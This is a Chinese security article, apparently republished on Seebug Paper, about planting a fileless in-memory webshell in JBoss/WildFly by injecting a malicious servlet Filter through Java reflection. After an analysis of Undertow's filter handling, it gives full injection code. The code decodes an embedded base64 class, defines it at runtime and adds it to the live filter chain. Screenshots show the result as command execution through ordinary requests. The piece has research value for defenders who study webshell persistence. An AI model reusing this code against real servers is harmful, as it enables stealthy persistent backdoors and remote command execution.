**作者：宽字节安全**  
**原文链接：<https://mp.weixin.qq.com/s/_SQS9B7tkL1H5fMIgPTOKw>**  
**本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！**  
**投稿邮箱：paper@seebug.org**

前几篇文章主要研究了tomcat，weblogic的无文件webshell。这篇文章则重点研究jboss的无文件webhsell。下面分享一下思路,以下分析基于
jboss 社区版 wildfly-20.0.0.Final版本。

## 0x01 wildfly 加载Filter分析

在Filter处随便打一个断点，如图，观察堆栈

![](https://images.seebug.org/content/images/2020/06/22/1592806381000-1rjanv.png-w331s)

jboss比较简单，处理Filter的代码如下所示

    
    
    io.undertow.servlet.handlers.FilterHandler#handleRequest
    
    public void handleRequest(HttpServerExchange exchange) throws Exception {
        ServletRequestContext servletRequestContext = (ServletRequestContext)exchange.getAttachment(ServletRequestContext.ATTACHMENT_KEY);
        ServletRequest request = servletRequestContext.getServletRequest();
        ServletResponse response = servletRequestContext.getServletResponse();
        DispatcherType dispatcher = servletRequestContext.getDispatcherType();
        Boolean supported = (Boolean)this.asyncSupported.get(dispatcher);
        if (supported != null && !supported) {
            servletRequestContext.setAsyncSupported(false);
        }
    
    
        List<ManagedFilter> filters = (List)this.filters.get(dispatcher);
        if (filters == null) {
            this.next.handleRequest(exchange);
        } else {
            FilterHandler.FilterChainImpl filterChain = new FilterHandler.FilterChainImpl(exchange, filters, this.next, this.allowNonStandardWrappers);
            filterChain.doFilter(request, response);
        }
    }

FilterHandler的handleRequest方法中，获取filter去创建filter。并创建FilterChainImpl。我们继续向上分析哪些函数调用了hadleRequest。在`io.undertow.servlet.handlers.ServletChain#ServletChain`方法中，会执行forceInit方法，forceInit方法的代码如下

    
    
    io.undertow.servlet.handlers.ServletChain#forceInit
                List<ManagedFilter> list = filters.get(dispatcherType);
                if(list != null && !list.isEmpty()) {
                    for(int i = 0; i < list.size(); ++i) {
                        ManagedFilter filter = list.get(i);
                        filter.forceInit();
                    }
                }

跟入ManagedFilter的forceInit方法，forceInit方法主要作用是调用ManagedFilter的createFilter方法，去初始化一个Filter。代码如下

    
    
        public void createFilter() throws ServletException {
            synchronized (this) {
                if (filter == null) {
                    try {
                        handle = filterInfo.getInstanceFactory().createInstance();
                    } catch (Exception e) {
                        throw UndertowServletMessages.MESSAGES.couldNotInstantiateComponent(filterInfo.getName(), e);
                    }
                    Filter filter = handle.getInstance();
                    new LifecyleInterceptorInvocation(servletContext.getDeployment().getDeploymentInfo().getLifecycleInterceptors(), filterInfo, filter, new FilterConfigImpl(filterInfo, servletContext)).proceed();
                    this.filter = filter;
                }
            }
        }

我们可以看出，在该函数中，如果检测到Filter没有注册，则通过`LifecyleInterceptorInvocation`去初始化一个Filter，并添加到`FilterHandler`的Filter中。

## 0x02 实现

### 1\. 获取ServletChain

在ServletRequestContext中，我们可以发现如下方法

    
    
        /**
         * Gets the current threads {@link ServletRequestContext} if set, otherwise null.
         *
         * @return The current {@link ServletRequestContext} based on the calling thread, or null if unavailable
         */
        public static ServletRequestContext current() {
            SecurityManager sm = System.getSecurityManager();
            if(sm != null) {
                sm.checkPermission(GET_CURRENT_REQUEST);
            }
            return CURRENT.get();
        }

通过ServletRequestContext.current这个静态方法，可以获取当前的`ServletRequestContext`对象。`ServletRequestContext`对象中，恰好存放我们需要的ServerChain对象。

![](https://images.seebug.org/content/images/2020/06/22/1592806382000-2lxana.png-w331s)

### 2\. 反射获取ServletChain的filter

filter的类型为EnumMap，key为REQUEST，value为数组，依次存放需要调用的Filter。可以通过反射调用，代码如下

    
    
        Field filtersF = servletChain.getClass().getDeclaredField("filters");
        filtersF.setAccessible(true);
        java.util.EnumMap filters = (EnumMap) filtersF.get(servletChain);

### 3\. 创建ManagedFilter

ServletChain的filter中，数组中的类型为`ManagedFilter`。`ManagedFilter`的构造参数中，需要两个参数，分别为FilterInfo与servletContext。这两个参数构造方法如下

#### 3.1 FilterInfo

FilterInfo中，并不需要Class.forName，通过名称去加载Filter类。相反，只需要在参数中提供Filter的Class即可，相关代码如下

    
    
        public FilterInfo(final String name, final Class<? extends Filter> filterClass) {
            try {
                final Constructor<Filter> ctor = (Constructor<Filter>) filterClass.getDeclaredConstructor();
                ctor.setAccessible(true);
                this.instanceFactory = new ConstructorInstanceFactory<>(ctor);
                this.name = name;
                this.filterClass = filterClass;
            } catch (NoSuchMethodException e) {
                throw UndertowServletMessages.MESSAGES.componentMustHaveDefaultConstructor("Filter", filterClass);
            }
        }

#### 3.2 servletContext

servletContext与Context不是一个类型。但是可以从Context中获取servletContext对象。

![](https://images.seebug.org/content/images/2020/06/22/1592806382000-3dlvue.png-w331s)

完整代码如下

    
    
        Method currentM = Class.forName("io.undertow.servlet.handlers.ServletRequestContext").getDeclaredMethod("current");
        Object curContext = currentM.invoke(null);
    
        Method getCurrentServletM = curContext.getClass().getMethod("getCurrentServlet");
        Object servletChain = getCurrentServletM.invoke(curContext);
    
        Field filtersF = servletChain.getClass().getDeclaredField("filters");
        filtersF.setAccessible(true);
        java.util.EnumMap filters = (EnumMap) filtersF.get(servletChain);
    
        String evilFilterClassName = "testFilter1";
        Class evilFilterClass = null;
    
        try {
            evilFilterClass = Class.forName(evilFilterClassName);
        } catch (ClassNotFoundException e) {
            BASE64Decoder b64Decoder = new sun.misc.BASE64Decoder();
            String codeClass = "H4sIAAAAAAAA...";
            Method defineClassM = Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClassM.setAccessible(true);
            evilFilterClass = (Class) defineClassM.invoke(Thread.currentThread().getContextClassLoader(), uncompress(b64Decoder.decodeBuffer(codeClass)), 0, uncompress(b64Decoder.decodeBuffer(codeClass)).length);
        }
    
        ArrayList filterList = (ArrayList) filters.get(DispatcherType.REQUEST);
        Object evilFilterInfo = Class.forName("io.undertow.servlet.api.FilterInfo").getDeclaredConstructors()[0].newInstance("UnicodeSec", evilFilterClass);
    
        Field servletRequestF = curContext.getClass().getDeclaredField("servletRequest");
        servletRequestF.setAccessible(true);
        Object obj = servletRequestF.get(curContext);
    
        Field servletContextF = obj.getClass().getDeclaredField("servletContext");
        servletContextF.setAccessible(true);
        Object servletContext = servletContextF.get(obj);
    
        Object evilManagedFilter = Class.forName("io.undertow.servlet.core.ManagedFilter").getDeclaredConstructors()[0].newInstance(evilFilterInfo, servletContext);
    
        filterList.add(evilManagedFilter);

## 0x03 成果检验

jboss有些特殊，上面的内存马只能在可以被正常访问的页面中才可以触发内存马。效果如下

添加需要执行的命令，内存马开始执行命令，并输入结果

![](https://images.seebug.org/content/images/2020/06/22/1592806382000-4hkmpm.png-w331s)

正常访问页面，则无反应

![](https://images.seebug.org/content/images/2020/06/22/1592806382000-5knlur.png-w331s)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1252/>

